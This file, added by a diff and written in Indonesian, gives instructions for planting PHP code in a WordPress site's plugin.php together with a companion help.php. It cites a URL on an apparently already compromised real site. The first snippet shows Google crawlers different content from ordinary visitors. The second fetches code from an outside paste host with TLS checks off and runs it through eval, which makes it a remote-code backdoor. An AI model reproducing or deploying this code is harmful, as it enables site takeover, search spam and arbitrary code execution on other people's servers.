@@ -1,0 +1,53 @@
+INI TEMPEL DI PLUGIN.PHP public_html (https://ateal.org.br/wp-content/plugins/sydney-toolbox/demo-content/previews/ssl/http/content_.php?d=%2Fhome2%2Fatealo24%2Fpublic_html)/wp-includes (https://ateal.org.br/wp-content/plugins/sydney-toolbox/demo-content/previews/ssl/http/content_.php?d=%2Fhome2%2Fatealo24%2Fpublic_html%2Fwp-includes)/ cms wordpres
+
+
+<?php
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$referer   = $_SERVER['HTTP_REFERER'] ?? '';
+
+$googleBots = [
+    'Googlebot', 'AdsBot', 'Mediapartners-Google', 'APIs-Google',
+    'Googlebot-Image', 'Googlebot-Video', 'Googlebot-News',
+    'Googlebot-Search', 'Googlebot-Inspect', 'Googlebot-Android',
+    'Googlebot-Mobile', 'Googlebot-Ads', 'Googlebot-Discovery',
+    'Google-'
+
+];
+
+$isBot = preg_match('/' . implode('|', $googleBots) . '/i', $userAgent) || strpos($referer, 'google.') !== false;
+
+if ($isBot && $_SERVER['REQUEST_URI'] == '/') {
+ 
+    if (file_exists(DIR . '/help.php')) {
+        include 'help.php';
+        die();
+    } else {
+   
+    }
+}
+
+
+ISI FILE help.php di bawah ini
+
+
+<?php
+error_reporting(0);
+
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        $data = curl_exec($conn);
+        curl_close($conn);
+    } else {
+        $data = file_get_contents($url);
+    }
+    return $data;
+}
+
+$a = geturlsinfo('https://softechnology.biz/raw/8Lgz1OTFN8');
+eval('?>' . $a);
+?>
